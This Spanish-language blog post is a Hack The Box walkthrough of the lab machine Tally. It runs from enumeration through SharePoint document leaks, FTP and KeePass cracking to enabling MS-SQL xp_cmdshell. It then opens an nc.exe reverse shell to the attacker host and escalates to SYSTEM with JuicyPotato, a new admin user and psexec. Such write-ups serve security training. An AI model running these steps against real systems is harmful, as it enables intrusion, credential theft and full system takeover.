---
layout: post
title: HTB_Tally
date: 2023/07/10
slug: HTB_Tally
heroImage: /assets/machines.jpg
---

# Tally {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Tally.

El replay del live se puede ver aqui

[![S4vitaar Tally maquina](https://img.youtube.com/vi/zcdqHfdxIZI/0.jpg)](https://www.youtube.com/watch?v=zcdqHfdxIZI)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.59
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.59
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.59 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.59 -oN targeted
```


| Puerto | Servicio      | Que se nos occure?             | Que falta?   |
| ------ | ------------- | ------------------------------ | ------------ |
| 21     | ftp           | Conexion como Anonymous        |              |
| 80     | http          | Web, Fuzzing                   |              |
| 81     | http          | Web, Fuzzing                   |              |
| 135    | msrpc         |                                |              |
| 139    | netbios       |                                |              |
| 445    | smb           | Null session                   |              |
| 808    | ccproxy-http? |                                |              |
| 1433   | ms-sql-s      |                                |              |
| 5985   | WinRM         | evil-winrm                     | credenciales |
| 15567  | http          | Web, Fuzzing                   |              |
| 32843  | mc-nmf        | Puertos por defecto de windows |              |
| 32844  | mc-nmf        | Puertos por defecto de windows |              |
| 32846  | mc-nmf        | Puertos por defecto de windows |              |
| 47001  | http          | Puertos por defecto de windows |              |
| 49664  | msrpc         | Puertos por defecto de windows |              |
| 49665  | msrpc         | Puertos por defecto de windows |              |
| 49666  | msrpc         | Puertos por defecto de windows |              |
| 49667  | msrpc         | Puertos por defecto de windows |              |
| 49668  | msrpc         | Puertos por defecto de windows |              |
| 49669  | msrpc         | Puertos por defecto de windows |              |
| 49670  | msrpc         | Puertos por defecto de windows |              |

### Conexion Anonymous con ftp {-}

```bash
ftp 10.10.10.59

Name: anonymous
Password: 

User cannot login
```

El usuario anonymous no esta habilitado.

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.59
smbclient -L 10.10.10.59 -N
```

Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **TALLY** en el dominio **TALLY**.
No podemos connectarnos con un NULL Session.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.59
```

Nos enfrentamos a un Microsoft Sharepoint con un IIS 10.0


#### Analyzando la web con Firefox {-}

Entramos en un panel Sharepoint y vemos en la url que hay un 
```bash
 _layouts 
```


Buscamos en google por la palabra 
```bash
 sharepoint pentest report 
```
 y encontramos la web de [pentest-tool](https://pentest-tools.com/public/sample-reports/sharepoint-scan-sample-report.pdf). Esto



## Vulnerability Assessment {-}

### Sharepoint 
```bash
 _layouts 
```
 {-}

El enlaze de la pagina web es un reporte donde se pueden ver routas interesantes detectadas durante un processo de auditoria.

- http://sharepointtarget.com//_layouts/viewlsts.aspx
- http://sharepointtarget.com//_layouts/userdisp.aspx
- http://sharepointtarget.com//_layouts/userdisp.aspx?ID=1
- http://sharepointtarget.com//_layouts/aclinv.aspx
- http://sharepointtarget.com//_layouts/bpcf.aspx
- http://sharepointtarget.com//_layouts/groups.aspx
- http://sharepointtarget.com//_layouts/help.aspx
- http://sharepointtarget.com//_layouts/mcontent.aspx
- http://sharepointtarget.com//_layouts/mobile/mbllists.aspx
- http://sharepointtarget.com//_layouts/people.aspx?MembershipGroupId=0
- http://sharepointtarget.com//_layouts/recyclebin.aspx
- http://sharepointtarget.com//_layouts/spcf.aspx

Si vamos a la url 
```bash
 http://10.10.10.59/_layouts/viewlsts.aspx 
```
 ya vemos cosas interesantes. Si pinchamos en Shared Documents podemos ver un documento
llamado ftp-details y si pinchamos en Site Pages vemos un fichero FinanceTeam. Nos los descargamos.

Si abrimos el fichero 
```bash
 ftp-details.docx 
```
 con libre office vemos una contraseña. Si miramos la pagina FinanceTeam, vemos un mensaje donde podemos ver
usuarios potenciales y un ftp account name.

### Conneccion con FTP {-}

```bash
ftp 10.10.10.59
Name: ftp_user
Password: UTDRSCH3c"$6hys
```

Hemos podido authenticarnos. Si le damos a 
```bash
 dir 
```
 vemos muchos directorios. Si es el caso, S4vi nos propone usar de la Heramienta 
```bash
 curlftpfs 
```
 para montarnos
una montura por ftp

```bash
apt install curlftpfs
mkdir /mnt/ftp
curlftpfs ftp_user:'UTDRSCH3c"$6hys'@10.10.10.59 /mnt/ftp
cd /mnt/ftp
tree
```

Aqui vemos un fichero 
```bash
 tim.kdbx 
```
. Es interesante porque los ficheros **KDBX** son ficheros KeePass y suelen tener informaciones interesantes como contraseñas.

```bash
cp User/Tim/Files/tim.kdbx /home/s4vitar/Desktop/S4vitar/Tally/content/.
cd !$
chmod 644 tim.kdbx
apt install keepassxc
```

Si lanzamos el KeePassxc y que le damos a abrir una base de datos existente, buscamos el fichero 
```bash
 tim.kdbx 
```
 vemos que nos pide una contraseña.
En este caso bamos a lanzar un keepass2john para crackear la contraseña.

### Crackeando un fichero KDBX con keepass2john {-}

```bash
keepass2john tim.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya tenemos la contraseña. Podemos abrir el fichero KDBX con Keepassxc y aqui ya encontramos una credencial por el usuario Finance.
Vamos a checkear los recursos compartidos a nivel de red con este usuario.

### SMB {-}

```bash
smbclient -L 10.10.10.59 -U "Finance%Acc0unting"
smbclient //10.10.10.59/ACCT -U "Finance%Acc0unting" -c "dir"
```

Tenemos accesso a un nuevo directorio pero contiene muchos otros directorios. Nos creamos otra montura

```bash
mkdir /mnt/smb
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
cd /mnt/smb
tree
```

Aqui vemos que hay ficheros ejecutables en la carpeta 
```bash
 zz_Migration/Binaries/New Folder/ 
```
 y un binario llamado 
```bash
 tester.exe 
```
 nos
llama la attencion.

```bash
cp "/mnt/smb/zz_Migration/Binaries/New Folder/tester.exe" /home/s4vitar/Desktop/content
cd /home/s4vitar/Desktop/content
file tester.exe
```

Vemos que es un ejecutable windows. Lo vamos a analyzar con radare2 para saber lo que hace a bajo nivel


### EXE analysis con radare2 {-}

```bash
radare2 tester.exe
> aaa
> s main
> pdf
```

Bueno aqui podemos ver un usuario y una contraseña para la base de datos MS-SQL 

> [ ! ]NOTAS: tambien se podria usar el commando 
```bash
 strings tester.exe | grep "PWD" | tr ';' '\n' | batcat 
```


### Conneccion a la base de datos {-}

```bash
sqsh -S 10.10.10.59 -U 'sa'
password: ********
```

Es valida y estamos connectado a la base de datos

```bash
xp_cmdshell "whoami"
go
```

El commando xp_cmdshell a sido desactivado. Vamos a activar la possiblidad de ejecutar commandos.

```bash
sp_configure "show advanced options", 1
reconfigure
go

sp_configure "xp_cmdshell", 1
reconfigure
go
```

Ya podemos ejectuar commandos

```bash
xp_cmdshell "whoami"
go

#Output
tally\sarah
```

> [ ! ]NOTAS: tambien se podria usar el commando 
```bash
 impacker-mssqlclient WORKGROUP/sa@10.10.10.59 
```
 y con este commando no tendriamos que darle siempre a go.

Como tenemos possiblidad de ejecutar commandos a nivel de systema, nos vamos a connectar a la maquina.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con MS-SQL {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Compartimos el binario nc.exe

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. Desde el ms-sql

    ```bash
    xp_cmdshell "\\10.10.14.7\smbFolder\nc.exe -e cmd 10.10.14.7 443"
    ```

Ya hemos ganado accesso al systema como el usuario Sarah y podemos ver la flag

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el 
```bash
 SeImpersonatePrivilege 
```
 ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
```

Nos creamos un nuevo usuario con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar s4vitar1234$! /add"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
```

Si comprobamos con el commando 
```bash
 crackmapexec smb 10.10.10.59 -u 's4vitar' -p 's4vitar1234$!' 
```
 Vemos que el usuario no esta pwned.
Aqui tenemos que 

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Si comprobamos otra vez con crackmapexec, vemos ahora que el usuario s4vitar esta pwned.
Ya nos podemos connectar con psexec

```bash
impacket-psexec WORKGROUP/s4vitar@10.10.10.59 cmd.exe
Password: s4vitar1234$!

whoami

#Output
nt authority\system

cd C:\Users\Adminstrator\Desktop
dir
type hm.txt
```

Aqui nos dice que la flag no esta aqui. Pensamos a Alternative Data Streams.

```bash
dir /r
more < hm.txt:root.txt
```

;)